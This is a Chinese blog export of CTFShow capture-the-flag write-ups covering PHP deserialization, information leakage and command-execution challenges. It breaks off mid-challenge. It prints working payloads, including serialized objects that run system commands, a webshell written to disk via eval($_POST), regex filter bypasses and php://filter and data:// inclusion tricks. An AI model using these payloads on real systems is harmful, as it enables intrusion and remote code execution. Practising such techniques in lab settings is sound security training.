对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。 \n\npayload: ?username=admin&amp;password=admin&amp;code=admin\n\nweb133web134web135web135web137web138web139web140web141web142web143web144web145web146web147web148web149web150","slug":"PHP特性","date":"2022-11-25T07:32:45.423Z","categories_index":"","tags_index":"","author_index":"Yum1"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"PHP反序列化web254include('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this-&gt;isVip;\n    }\n    public function login($u,$p){\n        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){\n            $this-&gt;isVip=true;\n        }\n        return $this-&gt;isVip;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this-&gt;isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    $user = new ctfShowUser();\n    if($user-&gt;login($username,$password)){\n        if($user-&gt;checkVip()){\n            $user-&gt;vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n\n?username=xxxxxx&amp;password=xxxxxx\n\nweb255include('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this-&gt;isVip;\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this-&gt;isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user-&gt;login($username,$password)){\n        if($user-&gt;checkVip()){\n            $user-&gt;vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n\nGET\n?username=xxxxxx&amp;password=xxxxxx\n\n$user = unserialize($_COOKIE['user']);\n$user-&gt;vipOneKeyGetFlag();\nif($this-&gt;isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }\n需要使$this-&gt;isVip的值为True，需要构造链子\n\n&lt;?php\n    class ctfShowUser{\n        public $isVip;\n        public function  __construct(){\n            $this-&gt;isVip = true;\n        }\n    }\n    \n    class ctfShowUser{\n        public $isVip=true;\n    }\n\n    $a = new ctfShowUser();\n    echo urlencode(serialize($a));\n?&gt;\n由于cookie中将\"作为截断符号，所需要编码绕过，这里采用url编码\nO%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\n\nweb256class ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this-&gt;isVip;\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this-&gt;isVip){\n            global $flag;\n            if($this-&gt;username!==$this-&gt;password){\n                    echo \"your flag is \".$flag;\n              }\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user-&gt;login($username,$password)){\n        if($user-&gt;checkVip()){\n            $user-&gt;vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n\nGET\n?username=1&amp;password=2\n\n&lt;?php\n    class ctfShowUser{\n        public $username='1';\n        public $password='2';\n        public $isVip=true;\n        \n    }\n\n    $a = new ctfShowUser();\n    echo urlencode(serialize($a));\n?&gt;\nO%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\n\nget传入的username和password要等于反序列化对象的username和passwd\n\nweb257class ctfShowUser{\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n\n    public function __construct(){\n        $this-&gt;class=new info();\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function __destruct(){\n        $this-&gt;class-&gt;getInfo();\n    }\n\n}\n\nclass info{\n    private $user='xxxxxx';\n    public function getInfo(){\n        return $this-&gt;user;\n    }\n}\n\nclass backDoor{\n    private $code;\n    public function getInfo(){\n        eval($this-&gt;code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    $user = unserialize($_COOKIE['user']);\n    $user-&gt;login($username,$password);\n}\n\n&lt;?php\n    class ctfShowUser{\n        private $class = 'backDoor';\n        public function __construct(){\n            $this-&gt;class=new backDoor();\n        }    \n    }\n\n    class backDoor{\n        private $code = 'system(\"cat flag.php\");';\n    }\n\n    $a = new ctfShowUser();\n    echo urlencode(serialize($a));\n?&gt;\n\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D\n\nGET\n?username=1&amp;password=1\n\nweb258class ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct(){\n        $this-&gt;class=new info();\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function __destruct(){\n        $this-&gt;class-&gt;getInfo();\n    }\n}\n\nclass info{\n    public $user='xxxxxx';\n    public function getInfo(){\n        return $this-&gt;user;\n    }\n}\n\nclass backDoor{\n    public $code;\n    public function getInfo(){\n        eval($this-&gt;code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user-&gt;login($username,$password);\n}\n\npreg_match('/[oc]:\\d+:/i', $_COOKIE['user'])\n正则过滤[oc]是匹配o字符或者c字符，\\d匹配一个数字字符，等价于[0-9]，+:  匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 \"zo\" 以及 \"zoo\"，但不能匹配 \"z\"。+ 等价于 {1,}。/i:  表示匹配的时候不区分大小写\n\"o:\"后不能跟数字，可以加个+号绕过\n\nO:11:\"ctfShowUser\":4:{s:8:\"username\";s:6:\"xxxxxx\";s:8:\"password\";s:6:\"xxxxxx\";s:5:\"isVip\";b:0;s:5:\"class\";O:8:\"backDoor\":1:{s:4:\"code\";s:17:\"system('tac f*');\";}}\n修改为改后：\nO:+11:\"ctfShowUser\":4:{s:8:\"username\";s:6:\"xxxxxx\";s:8:\"password\";s:6:\"xxxxxx\";s:5:\"isVip\";b:0;s:5:\"class\";O:+8:\"backDoor\":1:{s:4:\"code\";s:17:\"system('tac f*');\";}}再url编码\n\nO%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system('tac%20f*')%3B%22%3B%7D%7D\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct(){\n        $this-&gt;class=new info();\n    }\n    public function login($u,$p){\n        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;\n    }\n    public function __destruct(){\n        $this-&gt;class-&gt;getInfo();\n    }\n\n}\n\nclass info{\n    public $user='xxxxxx';\n    public function getInfo(){\n        return $this-&gt;user;\n    }\n}\n\nclass backDoor{\n    public $code;\n    public function getInfo(){\n        eval($this-&gt;code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user-&gt;login($username,$password);\n}\n\nweb259$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip-&gt;getFlag();\n\n一般反序列化的题目，那个php页面没用任何已有的类，那大概率就是考察PHP原生类的反序列化。\nweb260if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\n    echo $flag;\n}\n\n?ctfshow=ctfshow_i_love_36D\n\n?ctfshow=s:18:\"ctfshow_i_love_36D\"\n\n？？？？？\n&lt;?php\nclass ctfshow{\n    public $a='ctfshow_i_love_36D';\n}\necho serialize(new ctfshow());\n?&gt;\n?ctfshow=O:7:\"ctfshow\":1:{s:1:\"a\";s:18:\"ctfshow_i_love_36D\";}\n\nweb261class ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __wakeup(){\n        if($this-&gt;username!='' || $this-&gt;password!=''){\n            die('error');\n        }\n    }\n    public function __invoke(){\n        eval($this-&gt;code);\n    }\n\n    public function __sleep(){\n        $this-&gt;username='';\n        $this-&gt;password='';\n    }\n    public function __unserialize($data){\n        $this-&gt;username=$data['username'];\n        $this-&gt;password=$data['password'];\n        $this-&gt;code = $this-&gt;username.$this-&gt;password;\n    }\n    public function __destruct(){\n        if($this-&gt;code==0x36d){\n            file_put_contents($this-&gt;username, $this-&gt;password);\n        }\n    }\n}\n\nunserialize($_GET['vip']);\n\n如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，\n则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。\n\n当反序列化时会进入__unserialize中\n而且也没有什么方法可以进入到__invoke中，所以无法利用危险函数eval\n所以直接就朝着写文件搞就可以了。\n\n&lt;?php\nclass ctfshowvip{\n    public $username;\n    public $password;\n\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n}\n$a=new ctfshowvip('877.php','&lt;?php eval($_POST[1]);?&gt;');\necho serialize($a);\n\nO:10:\"ctfshowvip\":2:{s:8:\"username\";s:7:\"877.php\";s:8:\"password\";s:24:\"&lt;?php eval($_POST[1]);?&gt;\";}\n\n?vip=O:10:\"ctfshowvip\":2:{s:8:\"username\";s:7:\"877.php\";s:8:\"password\";s:24:\"&lt;?php eval($_POST[1]);?&gt;\";}\n访问877.php，并post传入：1=phpinfo();\n成功rce\n\n1=system(\"ls /\");\n1=system(\"cat /flag_is_here\");\n\nweb262index.php\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n\nmessage.php\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\nif(isset($_COOKIE['msg'])){\n    $msg = unserialize(base64_decode($_COOKIE['msg']));\n    if($msg-&gt;token=='admin'){\n        echo $flag;\n    }\n}\n\npayload\n\nclass message{\n    public $token='admin';\n}\n$msg = new message;\necho base64_encode(serialize($msg));\n\nTzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9\n\n\nweb263ini_set('session.serialize_handler', 'php');\n\n其中session.serialize_handler是用来设置session的序列话引擎\n不同的引擎所对应的session的存储方式不相同\n\nphp_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\n\nphp:存储方式是，键名+竖线+经过serialize()函数序列处理的值\n\nphp_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 \n\nsession 的目录在 /var/lib/php/sessions 中，如果我们执行下面的代码\n&lt;?php\nini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n$_SESSION['name'] = 'spoock';\nvar_dump($_SESSION);\n在 php_serialize 引擎下，会生成一个session文件，session文件中存储的数据为:\na:1:{s:4:\"name\";s:6:\"spoock\";}\n\nphp 引擎下文件内容为:\nname|s:6:\"spoock\";\nphp_binary 引擎下文件内容为:\nnames:6:\"spoock\";\n\n\n\n\nweb264class message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    $_SESSION['msg']=base64_encode($umsg);\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n\n","slug":"PHP反序列化","date":"2022-11-25T07:32:45.421Z","categories_index":"","tags_index":"","author_index":"Yum1"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"PHP TIPS\n\n\n_就是全局变量\neval与system\neval可以等价于&lt;?\neval(\"asdasdasd;\");\n&lt;?php asdasdasd;\n\neval(\"?&gt;\" + \"system(ls);\");\n&lt;?php ?&gt;system(ls);\n\n","slug":"PHP TIPS","date":"2022-11-25T07:32:45.419Z","categories_index":"","tags_index":"","author_index":"Yum1"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"JAVA\n","slug":"JAVA","date":"2022-11-25T07:32:45.417Z","categories_index":"","tags_index":"","author_index":"Yum1"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"CTFShow\n信息收集web1开发注释未及时删除 \n直接查看源码，flag在注释里\nweb2js前台拦截 === 无效操作\n浏览器禁用js或则Burp抓包\nweb3f12 网络在响应头里就有flag或者直接抓包\nweb4robots.txt文件泄露\n直接查看robots.txt\nrobots.txt （统一小写）是一种存放于网站根目录下的ASCII编码的文本文件。\n常见的备份文件\n.index.php.swp\nindex.php.swp\nindex.php.bak\n.index.php~\nindex.php.bak_Edietplus\nindex.php.~\nindex.php.1\nindex.php\nindex.php~\nindex.php.rar\nindex.php.zip\nindex.php.7z\nindex.php.tar.gz\nwww.zip\nwww.rar\nwww.zip\nwww.7z\nwww.tar.gz\nwww.tar\nweb.zip\nweb.rar\nweb.zip\nweb.7z\nweb.tar.gz\nweb.tar\nwwwroot.rar\nweb.rar\n\nweb5phps文件泄露\nphps存放着php源码，可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取\nphp备份文件：后缀为php~或者index.php.bak\n\nphp的源代码文件：后缀为phps\n\nweb6源码压缩包泄露\n直接访问www.zip，压缩包发现fl000g.txt，url+fl000g.txt访问\nweb7版本控制泄露源码\ngit / svn\n\n是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。\n访问 url/.git/ ，得到 flag 。\n.git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git/index文件可找到工程所有文件名和sha1文件,在git/objects下载导致危害\n类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。\nweb8.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）\n访问 url/.svn/ ，得到 flag 。\nSubversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。\nweb9vim临时文件泄露\n如果vim编写时 不是正常退出 就会临时留下一个 后缀名为swp的文件 我们可以查看该文件同时多次意外退出并不会覆盖旧的.swp文件，而是会生成一个新的，例如**.swo**文件。\nvim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn\n直接访问index.php.swp\n一、vim备份文件\n\n     默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；\n\n    eg:index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~\n\n二、vim临时文件\n\n    vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件\n\n .submit.swp。如果文件正常退出，则此文件自动删除。\n\nweb10cookie泄露，直接 F12 或 burp 抓包看cookie获取flag 。\nweb11域名txt记录泄露\n域名其实也可以隐藏信息，在线DNS域名解析，即可得到flag\nhttps://whois.chinaz.com/\nhttp://www.jsons.cn/nslookup/\nhttps://zijian.aliyun.com/\n\nweb12敏感信息公布\nurl/admin/访问后台需要登陆\n猜测用户名为admin，密码为页面最下方联系电话号码，登录成功\nweb13内部技术文档泄露\n在页面最下方找到了document，点击进入发现是内部文档，通过后台地址以及用户名和密码登录获取flag\nweb14编辑器配置不当\n进入url/editor/\n插入文件-&gt;文件空间\n随便点点看看有没有可疑文件，最后发现tmp/html/nothinghere/fl000g.txt\n直接访问url+/nothinghere/fl000g.txt进入得到flag\nweb15密码逻辑脆弱\n进入url/admin/，需要用户名和密码登录，点击找回密码，需要填写所在地，在页面最下方有一个qq邮箱，通过qq号查询发现在西安，填写密保问题重置密码，登录成功获取flag\nweb16探针泄露\n考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag\n\n访问/tz.php\n再点击进入phpinfo可以得到flag\nweb17备份SQL文件泄露\nbackup.sql\nweb18js敏感信息泄露\n直接查看js代码，在分数大于100时，windows.confirm(一串uniciode编码)，将其转换为中文，得到110.php，获得flag\nweb19前端密钥泄露\n直接查看前端代码，在注释发现用户名和密码，直接登录失败，使用Burp发包，获得flag\nweb20mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}\nweb21CDN穿透\n确定 IP 的话，直接 ping 域名，得到 IP\n\n爆破web21tomcat 认证爆破之custom iterator使用 - 007NBqaq - 博客园 (cnblogs.com)\n抓包发现，随便输入的密码被base64编码，解码username:password\n对密码进行爆破，猜测用户名为admin:\n\n爆破时要进行base64加密以及关掉默认的url编码\n\n最后密码为shark63，获取flag\nweb22子域名爆破\n使用域名挖掘机\nweb23substr(string,start,length)\n\n\n打开就是一段代码，手动写一段脚本爆破\n&lt;!DOCTYPE html&gt;\n&lt;html lang='en'&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;?php    \n    for ($i = 0; $i &lt; 1000; $i = $i + 1) {\n        $token = md5($i);\n        if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) {\n            if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {\n                echo $i;\n            }\n        }\n    }\n    ?&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n\nweb24mt_srand伪随机数\nmt_srand函数只要规定了种子，其得到的伪随机数就是确定的，因此，我们自行构造一个和其种子一样的代码\nmt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的\n\n&lt;?php\n        mt_srand(372619038);    \n        echo intval(mt_rand());\n?&gt;\n\nweb25mtrand()随机数生成漏洞\ninclude(\"flag.php\");\nif(isset($_GET['r'])){\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0,8)));\n    $rand = intval($r)-intval(mt_rand());//当r取0的时候就可以得到mt_rand()的值\n    if((!$rand)){\n        if($_COOKIE['token']==(mt_rand()+mt_rand())){\n            echo $flag;\n        }\n    }else{\n        echo $rand;\n    }\n}else{\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n\n\n使用php_mt_seed - MT_RAND（）种子饼干 (openwall.com)爆破出种子\n\n最后可以得到，这三个mt_rand()的值都不一样\n&lt;?php\n        mt_srand(2414568491);    \n        echo mt_rand().\"\\n\";\n        echo mt_rand()+mt_rand();\n\n  ?&gt;\n\n然后通过burp发包获取flag\n\nweb26抓包后直接发包得到flag\n\nweb27爆破生日日期\n可以获取录取名单，得到姓名和缺少出生日期的身份证号码\n\n在查询页面发包\n\n抓取后进行爆破\n\n\n最后得到正确的日期\n\n登录获取flag\nweb28提示爆破目录\n通过暴力破解目录/0-100/0-100/看返回数据包\n爆破的时候去掉2.txt 仅仅爆破目录即可\n\n\n\n命令执行web29preg_match 执行一个正则表达式匹配\n\n&lt;?php\n//模式分隔符后的\"i\"标记这是一个大小写不敏感的搜索\nif (preg_match(\"/php/i\", \"PHP is the web scripting language of choice.\")) {\n    echo \"查找到匹配的字符串 php。\";\n} else {\n    echo \"未发现匹配的字符串 php。\";\n}\n?&gt;\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\n首先执行ls命令，利用system\n?c=system(ls);\n得到两个文件 flag.php和index.php\n用cat命令读取flag.php，因为过滤了flag所以使用通配符\n?c=system('cat fla*.php');\n?c=system(\"nl fla?????\");\n?c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`;\n?c=echo `nl fl\\ag.php`;//转义字符绕过\n?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php\n?c=eval($_GET[1]);&amp;1=system('nl flag.php');\n?c=awk '{printf $0}' flag.php||\n?c=$a=\"fla\";$b=\"g.php\";echo%20file_get_contents($a.$b);\n\nlinux文件内容查看命令\ncat、tac、nl、more、less、head、tail、``\n\n通配符\n*可以通配多个字符\n?可以通配一个字符\n\nweb30过滤了flag、system、php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\n可以使用其他函数\nsystem()\npassthru()\nexec()\nshell_exec()\npopen()\nproc_open()\npcntl_exec()\n反引号 同shell_exec()\n\nc=echo exec('nl fla?????');\nc=echo `nl fla''g.p''hp`;\nc=echo `nl fla?????`;\n\nweb31error_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nc=eval($_GET[1]);&amp;1=system('nl flag.php');//只过滤了c，1可以继续使用空格\nc=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));\nc=show_source(next(array_reverse(scandir(pos(localeconv())))));\nc=echo(`nl%09fl[abc]*`);//%09就是tab,[abc]也是正则的一种\nc=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"(\"nl%09fl[a]*\");等价于system()\nc=echo`strings%09f*`;\nc=echo`strings\\$IFS\\$9f*`必须加转义字符\n\nshow_source(next(array_reverse(scandir(pos(localeconv())))));\n\nscandir('.')这个函数的作用是扫描当前目录\nlocaleconv()函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.\npos()/current()函数返回数组第一个值\narray_reverse()是将数组颠倒\nnext()将数组指针一项下一位\nshow_source()的意思是读取函数内容\n\nweb32if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nc=$nice=include$_GET[\"url\"]?&gt;&amp;url=php://filter/read=convert.base64-\nencode/resource=flag.php\n//include可以不用括号，后面直接跟变量不用空格，分号可以用?&gt;代替\n//利用filter协议读文件，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。\n\ndata伪协议\n把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本\nc=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\nc=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n\nweb33if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nc=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-\nencode/resource=flag.php\n\nc=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\n\nweb34if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nweb35同上\nweb36if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=|\\/|[0-9]/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nc=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php\n\nc=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\n\nweb37if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== //&lt;?php system('cat flag.php');?&gt;\n\n/?c=data://text/plain,&lt;?php system('cat fla*');?&gt;\n\n还可以配合UA头执行日志包含\nc=/var/log/nginx/access.log\n\nweb38if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|php|file/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n\n也可以日志包含\nc=/var/log/nginx/access.log\n\nweb39data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c.\".php\");\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n/?c=data://text/plain,&lt;?php system('cat fla*');?&gt;\n??为什么base64不行\n\nweb40if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    